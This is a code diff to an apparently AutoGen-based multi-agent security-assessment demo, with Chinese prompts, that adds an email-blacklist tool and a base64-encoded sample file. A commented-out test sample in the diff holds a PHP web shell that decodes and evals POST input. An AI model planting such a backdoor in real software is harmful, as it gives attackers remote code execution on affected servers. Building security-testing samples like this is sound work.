@@ -70,7 +70,15 @@ base64_tool = HttpTool(
 async def create_sample_file():
     sample_file_path = "sample.txt"
     with open(sample_file_path, "w") as f:
-        f.write("SGVsbG8sIFdvcmxkIQ==")
+        # f.write("""
+        #     <?php  
+        #     $k = "password";  
+        #     $f = "base64_decode";  
+        #     $c = $f("ZXZhbCgkX1BPU1RbJ2MnXSk7");  
+        #     @eval($c);  
+        #     ?>"""
+        # )
+        f.write(f"Nzk5MDQ5MzcxQHFxLmNvbQ==")
     return sample_file_path
 
 
@@ -108,6 +116,19 @@ file_read_tool = FunctionTool(
     description="读取指定本地文件的内容",
 )
 
+def check_email_black(email_address: str) -> bool:
+    if email_address == "799049371@qq.com":
+        return True
+    else:
+        return False
+
+
+# 使用 FunctionTool 包装文件读取函数
+check_email_tool = FunctionTool(
+    func=check_email_black,
+    name="check_email_black",
+    description="判断恶意黑名单邮件地址",
+)
 
 async def main():
     # 创建 HTTP 代理，配备 base64 解码工具
@@ -122,8 +143,8 @@ async def main():
     toolkit_agent = AssistantAgent(
         name="toolkit_agent",
         model_client=model_client,
-        tools=[file_read_tool, base64_tool],
-        description="能够读取本地文件、解码base64",
+        tools=[file_read_tool, base64_tool, check_email_tool],
+        description="这是一个工具箱, 里面有: 读取本地文件, 解码base64, 判断黑名单邮件地址 等工具",
     )
 
     security_agent = AssistantAgent(
@@ -132,7 +153,7 @@ async def main():
         description="评估项目安全性",
         system_message="""
             你负责根据漏洞扫描、配置安全性、访问控制等角度评估项目的安全。
-            你可以请求 toolkit_agent 获取漏洞接口或配置文件内容。
+            约束：请优先考虑使用 toolkit_agent 提供的能力。
         """
     )
 
@@ -172,6 +193,7 @@ async def main():
     team = SelectorGroupChat(
         participants=[toolkit_agent, security_agent, summary_agent],
         model_client=model_client,
+        allow_repeated_speaker=True,
         # selector_func=selector_func,
         termination_condition=termination,
         max_turns=10,
@@ -197,7 +219,7 @@ async def main():
 
     # 示例任务列表
     tasks = generate_task_instruction([
-        f"评估文件 {sample_file_path} 的安全性",
+        f"评估文件 {sample_file_path} 是否包含黑名单邮件地址",
     ])
     
     stream = team.run_stream(task=tasks)
